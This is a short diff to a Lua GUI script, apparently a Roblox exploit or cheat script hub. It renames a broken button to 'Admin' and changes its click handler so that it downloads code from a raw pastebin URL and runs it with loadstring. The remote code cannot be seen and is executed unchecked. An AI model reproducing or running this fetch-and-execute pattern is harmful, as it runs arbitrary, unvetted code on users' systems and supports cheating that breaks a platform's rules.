@@ -1814,13 +1814,13 @@ TextButton_16.BackgroundTransparency = 1.000
 TextButton_16.Position = UDim2.new(0.302768171, 0, 0.360294133, 0)
 TextButton_16.Size = UDim2.new(0, 257, 0, 75)
 TextButton_16.Font = Enum.Font.Antique
-TextButton_16.Text = "Broken - Looking For Replacement"
+TextButton_16.Text = "Admin"
 TextButton_16.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_16.TextScaled = true
 TextButton_16.TextSize = 14.000
 TextButton_16.TextWrapped = true
 TextButton_16.MouseButton1Down:Connect(function()
-	print ('Script Broken')
+	loadstring(game:HttpGet(('https://pastebin.com/raw/Caniwq2N'), true))()
 end)
 
 ImageLabel_13.Parent = Page2
